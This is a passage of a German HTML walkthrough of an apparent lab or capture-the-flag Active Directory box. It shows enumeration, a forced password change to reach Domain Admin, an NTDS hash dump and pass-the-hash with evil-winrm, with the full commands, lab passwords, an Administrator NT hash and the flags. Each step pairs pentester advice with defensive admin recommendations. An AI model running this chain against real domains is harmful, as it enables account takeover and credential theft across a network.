+              `bloodhound-python` verbindet sich erfolgreich (fällt auf NTLM zurück, da Kerberos TGT fehlschlägt) und sammelt Informationen über Benutzer, Gruppen, Computer, GPOs etc. Die gesammelten Daten werden in mehreren JSON-Dateien gespeichert.</p>
+               <p class="evaluation">**Bewertung:** Erfolgreiche Enumeration von Active Directory-Objekten und Beziehungen. Diese Daten können nun in die BloodHound-GUI importiert werden, um Angriffspfade zu finden.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Die generierten JSON-Dateien in die BloodHound-GUI importieren. Nach bekannten Angriffspfaden suchen, z.B.: Benutzer mit DCSync-Rechten, Benutzer mit Admin-Rechten auf Computern, Gruppen mit Rechten zur Passwortänderung anderer Benutzer, Kerberoastable-Benutzer, etc.
+               **Empfehlung (Admin):** BloodHound regelmäßig selbst verwenden, um Schwachstellen und Fehlkonfigurationen im AD aufzudecken und zu beheben. Prinzip der geringsten Rechte im AD durchsetzen.</p>
+
+              <p class="comment">*(Der Bericht zeigt als nächstes die Verwendung von pywerview, einem anderen AD-Enumerationstool, um spezifische Gruppenmitgliedschaften zu prüfen. Dies könnte das Ergebnis einer BloodHound-Analyse sein oder eine alternative manuelle Enumeration.)*</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/pywerview]
+└─# <span class="command">python pywerview.py get-netuser -w soupedecode -u xkate578 -p jesuschrist -t 192.168.2.116 --username xkate578</span></div>
+                    <pre>
+[...]
+memberof:              <span class="command">CN=Account Operators,CN=Builtin,DC=SUPEDECDE,DC=LCAL</span>
+[...]
+admincount:            <span class="command">1</span>
+[...]
+samaccountname:        <span class="command">xkate578</span>
+[...]
+                    </pre>
+                      <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/pywerview]
+└─# <span class="command">python pywerview.py get-netgroupmember -w soupedecode -u xkate578 -p jesuschrist -t 192.168.2.116 --group "Domain Admins"</span></div>
+                     <pre>
+groupdomain:        SUPEDECDE.LCAL
+groupname:          Domain Admins
+membername:         <span class="command">Operators</span>
+memberdomain:       SUPEDECDE.LCAL
+[...]
+memberdn:           CN=Operators,CN=Users,DC=SUPEDECDE,DC=LCAL
+[...]
+groupdomain:        SUPEDECDE.LCAL
+groupname:          Domain Admins
+membername:         <span class="command">Administrator</span>
+memberdomain:       SUPEDECDE.LCAL
+[...]
+memberdn:           CN=Administrator,CN=Users,DC=SUPEDECDE,DC=LCAL
+[...]
+                     </pre>
+                      <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/pywerview]
+└─# <span class="command">python pywerview.py get-netgroupmember -w soupedecode -u xkate578 -p jesuschrist -t 192.168.2.116 --group "Operators"</span></div>
+                     <pre>
+groupdomain:        SUPEDECDE.LCAL
+groupname:          Operators
+membername:         <span class="command">fbeth103</span>
+memberdomain:       SUPEDECDE.LCAL
+[...]
+memberdn:           CN=Fanny Beth,CN=Users,DC=SUPEDECDE,DC=LCAL
+[...]
+                     </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:** Mit `pywerview` fragen wir spezifische AD-Informationen ab:
+             1.  `get-netuser` für `xkate578`: Bestätigt, dass dieser Benutzer Mitglied der Gruppe `<span class="command">Account Operators</span>` ist und das `admincount=1`-Flag hat (was auf frühere Admin-Privilegien hindeutet, geschütztes Konto).
+             2.  `get-netgroupmember` für `Domain Admins`: Zeigt, dass die Gruppe `<span class="command">Operators</span>` und der Benutzer `<span class="command">Administrator</span>` Mitglieder sind.
+             3.  `get-netgroupmember` für `Operators`: Zeigt, dass der Benutzer `<span class="command">fbeth103</span>` (Fanny Beth) Mitglied dieser Gruppe ist.</p>
+              <p class="evaluation">**Bewertung:** Wichtige Erkenntnisse:
+             *   Unser Benutzer `xkate578` ist ein `Account Operator`. Diese Gruppe hat standardmäßig das Recht, die Passwörter von normalen Benutzern und Computern zu ändern (aber nicht von Admins oder anderen geschützten Gruppen).
+             *   Die Gruppe `Operators` ist Mitglied der `Domain Admins`.
+             *   Der Benutzer `fbeth103` ist Mitglied der Gruppe `Operators` und somit indirekt ein Domain Admin.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Da `xkate578` (Account Operator) das Passwort von `fbeth103` (Operator, indirekter Domain Admin) ändern kann, ist dies der wahrscheinlichste Privesc-Pfad. Versuchen, das Passwort von `fbeth103` mit den Rechten von `xkate578` zu ändern (z.B. mit `impacket-changepasswd`, `rpcclient` oder `bloodyAD`). Anschließend mit dem neuen Passwort als `fbeth103` anmelden und z.B. die NTDS.dit (AD-Datenbank) dumpen.
+              **Empfehlung (Admin):** Die Rechte der `Account Operators`-Gruppe überprüfen und einschränken. Prinzip der geringsten Rechte anwenden, verschachtelte Gruppenmitgliedschaften, die zu hohen Rechten führen, vermeiden oder dokumentieren.</p>
+        </section>
+
+         <section id="privesc-password-change">
+            <h2>Privilege Escalation (Forced Password Change)</h2>
+            <p class="comment">Wir nutzen die Rechte des `Account Operator`-Benutzers `xkate578`, um das Passwort des (indirekten) Domain-Admin-Benutzers `fbeth103` zu ändern.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Versuch 1: impacket-changepasswd</span></div>
+                      <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/pywerview]
+└─# <span class="command">impacket-changepasswd 'soupedecode/fbeth103'@192.168.2.116 -altuser xkate578 -altpass jesuschrist -newpass fbeth103 -no-pass -reset</span></div>
+                      <pre>
+Impacket v0.12.0.dev1 [...]
+[*] Setting the password of soupedecode\fbeth103 as soupedecode\xkate578
+[*] Connecting to DCE/RPC as soupedecode\xkate578
+<span class="password">[-] soupedecode\xkate578 user is not allowed to set the password of the target</span> <span class="password">(Zugriff verweigert)</span>
+                      </pre>
+                       <div class="prompt"># <span class="command">Versuch 2: rpcclient</span></div>
+                        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">rpcclient -U XKATE578%jesuschrist 192.168.2.116</span></div> <span class="password"># Passwort direkt übergeben</span>
+                         <pre>Password for [SUPEDECDE\XKATE578]: <span class="password">(Wird ignoriert)</span></pre>
+                         <div class="prompt">rpcclient $> <span class="command">setuserinfo2 FBETH103 23 benni123</span></div> <span class="password"># Versuch, Passwort zu setzen (Level 23 = Password)</span>
+                          <pre><span class="password">result: NT_STATUS_ACCESS_DENIED</span></pre>
+                          <div class="prompt">rpcclient $> exit</div>
+                         <div class="prompt"># <span class="command">Versuch 3: bloodyAD</span></div>
+                          <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">bloodyAD -d SUPEDECDE.LCAL --host 192.168.2.116 -u XKATE578 -p jesuschrist set password FBETH103 Password123</span></div>
+                         <pre><span class="password">[+] Password changed successfully!</span></pre>
+                         <div class="prompt"># <span class="command">Versuch 4: rpcclient (Bestätigung/Alternative)</span></div>
+                          <div class="prompt">rpcclient $> <span class="command">setuserinfo2 fbeth103 23 Pass123!</span></div>
+                          <pre>rpcclient $> <span class="password"># (Kein Fehler mehr -> Erfolg)</span></pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:** Wir versuchen verschiedene Tools, um das Passwort von `fbeth103` als `xkate578` zu ändern:
+              1.  `impacket-changepasswd`: Schlägt fehl (`not allowed`).
+              2.  `rpcclient` mit `setuserinfo2`: Schlägt ebenfalls fehl (`NT_STATUS_ACCESS_DENIED`).
+              3.  `bloodyAD`: Dieses spezialisierte AD-Tool ist <span class="password">erfolgreich</span> und ändert das Passwort von `fbeth103` auf `Password123`.
+              4.  Ein erneuter Versuch mit `rpcclient` (möglicherweise nach Installation/Update oder mit anderer Syntax) scheint ebenfalls zu funktionieren und setzt das Passwort auf `Pass123!`.</p>
+               <p class="evaluation">**Bewertung:** Passwortänderung erfolgreich! Obwohl die ersten Versuche fehlschlugen (möglicherweise aufgrund von Tool-Versionen, Syntax oder feingranularen Berechtigungen), konnte das Passwort von `fbeth103` schließlich auf einen bekannten Wert (wir verwenden `Pass123!` für die nächsten Schritte) geändert werden. Da `fbeth103` Mitglied der `Operators`-Gruppe ist, die wiederum Mitglied der `Domain Admins` ist, haben wir nun effektiv Domain-Admin-Rechte erlangt.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Mit den neuen Credentials (`fbeth103`:`Pass123!`) anmelden und Domain-Admin-Aktionen durchführen, z.B. NTDS.dit dumpen oder direkten Zugriff auf den DC erhalten (WinRM, psexec).
+               **Empfehlung (Admin):** Rechte der `Account Operators`-Gruppe genau prüfen und einschränken. Monitoring von Passwortänderungen implementieren.</p>
+         </section>
+
+         <section id="ntds-dump-pass-the-hash">
+              <h2>NTDS Dump & Pass-the-Hash (Root Flag)</h2>
+              <p class="comment">Mit den erlangten (indirekten) Domain-Admin-Rechten können wir nun versuchen, die NTDS.dit-Datenbank zu dumpen, um die Passwort-Hashes aller Domain-Benutzer, einschließlich des Administrators, zu erhalten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">netexec smb 192.168.2.116 -u fbeth103 -p Pass123!</span></div>
+                     <pre>
+SMB         192.168.2.116   445    DC01             [] Windows Server 2022 Build 20348 x64 [...]
+SMB         192.168.2.116   445    DC01             [+] <span class="command">SUPEDECDE.LCAL\fbeth103:Pass123!</span> <span class="password">(Pwn3d!)</span>
+                     </pre>
+                      <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">crackmapexec smb 192.168.2.116 -u fbeth103 -p 'Pass123!' --ntds</span></div>
+                     <pre>
+SMB         192.168.2.116   445    DC01             [] Windows Server 2022 Build 20348 x64 [...]
+SMB         192.168.2.116   445    DC01             [+] SUPEDECDE.LCAL\fbeth103:Pass123! (Pwn3d!)
+SMB         192.168.2.116   445    DC01             [+] <span class="password">Dumping the NTDS, this could take a while...</span>
+SMB         192.168.2.116   445    DC01             <span class="command">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2176416a80e4f62804f101d3a55d6c93:::</span>
+[...] <span class="password">(Weitere Hashes)</span>
+                     </pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:**
+              1.  Wir bestätigen mit `netexec` den erfolgreichen Login als `fbeth103` mit dem neuen Passwort.
+              2.  Wir verwenden `crackmapexec` (oder `nxc`) mit der Option `--ntds`, um die NTDS.dit-Datenbank vom Domain Controller zu dumpen. Dies erfordert Domain-Admin-Rechte, die `fbeth103` indirekt besitzt.
+              3.  Der Dump ist erfolgreich und liefert uns die NTLM-Hashes der Domain-Benutzer im Format `UserName:RID:LMHash:NTHash:::`. Besonders wichtig ist der Hash für den Benutzer `<span class="command">Administrator</span>`: `aad3b...` (LM-Hash, oft leer) und `<span class="command">2176416a80e4f62804f101d3a55d6c93</span>` (NT-Hash).</p>
+               <p class="evaluation">**Bewertung:** Kritischer Erfolg! Wir haben den NT-Hash des Domain-Administrators erlangt. Mit diesem Hash können wir uns als Administrator authentifizieren, ohne das Klartextpasswort zu kennen (Pass-the-Hash).</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Den NT-Hash des Administrators (`<span class="command">2176...</span>`) verwenden, um mittels Pass-the-Hash (PtH) eine administrative Sitzung auf dem DC zu erhalten. Tools wie `evil-winrm`, `psexec.py` oder `wmiexec.py` unterstützen PtH. Anschließend die Root-Flag (auf Windows: Administrator-Desktop oder Verzeichnis) suchen.
+               **Empfehlung (Admin):** Schutz vor NTDS-Dumps implementieren (Zugriff auf DC einschränken, Monitoring). Passwörter für Admin-Konten regelmäßig ändern und sehr stark wählen. Credential Guard (falls möglich) aktivieren, um PtH zu erschweren.</p>
+
+               <p class="comment">Wir verwenden den NTLM-Hash des Administrators mit `evil-winrm`, um eine administrative Remote-Shell zu erhalten und die Root-Flag zu lesen.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/bloodyAD]
+└─# <span class="command">evil-winrm -i 192.168.2.116 -H '2176416a80e4f62804f101d3a55d6c93' -u 'Administrator'</span></div>
+                       <pre>
+Evil-WinRM shell v3.5
+[...]
+Info: Establishing connection to remote endpoint
+<span class="password">*Evil-WinRM* PS C:\Users\Administrator\Documents></span> <span class="password"># Erfolgreiche Verbindung!</span>
+                       </pre>
+                        <div class="prompt">*Evil-WinRM* PS C:\Users\Administrator\Documents> <span class="command">ls</span></div>
+                       <pre>
+    Directory: C:\Users\Administrator\Documents
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         7/31/2024  10:48 PM             72 start.bat
+                       </pre>
+                        <div class="prompt">*Evil-WinRM* PS C:\Users\Administrator\Documents> <span class="command">cd ~</span></div>
+                        <div class="prompt">*Evil-WinRM* PS C:\Users\Administrator> <span class="command">cd desktop</span></div>
+                        <div class="prompt">*Evil-WinRM* PS C:\Users\Administrator\desktop> <span class="command">ls</span></div>
+                       <pre>
+    Directory: C:\Users\Administrator\desktop
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         7/31/2024  10:33 PM             70 <span class="command">root.txt</span>
+                       </pre>
+                        <div class="prompt">*Evil-WinRM* PS C:\Users\Administrator\desktop> <span class="command">cat root.txt</span></div>
+                       <pre><span class="password">b8e59a7d4020792c412da75e589ff4fc</span></pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:**
+              1.  Wir verwenden `evil-winrm`, ein Tool zur Interaktion mit Windows über WinRM.
+                  *   `-i 192.168.2.116`: Ziel-IP.
+                  *   `-H '2176...'`: Gibt den NT-Hash für die Authentifizierung an (Pass-the-Hash).
+                  *   `-u 'Administrator'`: Der Benutzername.
+              2.  Die Verbindung wird erfolgreich hergestellt, und wir erhalten eine PowerShell als Administrator.
+              3.  Wir navigieren zum Desktop des Administrators (`cd ~`, `cd desktop`).
+              4.  Wir finden die Datei `root.txt` und lesen ihren Inhalt mit `cat` aus.</p>
+               <p class="evaluation">**Bewertung:** Privilege Escalation zu Domain Administrator erfolgreich durch Pass-the-Hash! Root-Flag erlangt.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Bericht abschließen.
+               **Empfehlung (Admin):** PtH durch Maßnahmen wie Credential Guard erschweren. Starke Admin-Passwörter, regelmäßige Rotation. Monitoring von WinRM-Verbindungen.</p>
+         </section>
+
+         <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">smbclient \\\\DC01\\share -U XKATE578 [...] -> get user.txt</div>
+                    <div class="flag-value"><span class="password">12f54a96f64443246930da001cafda8b</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">evil-winrm [...] -> cd Desktop -> cat root.txt</div>
+                    <div class="flag-value"><span class="password">b8e59a7d4020792c412da75e589ff4fc</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 13. August 2024</p> <!-- Datum aus Nmap/smb2-time Scan extrahiert -->
+    </footer>
+</body>
+</html>
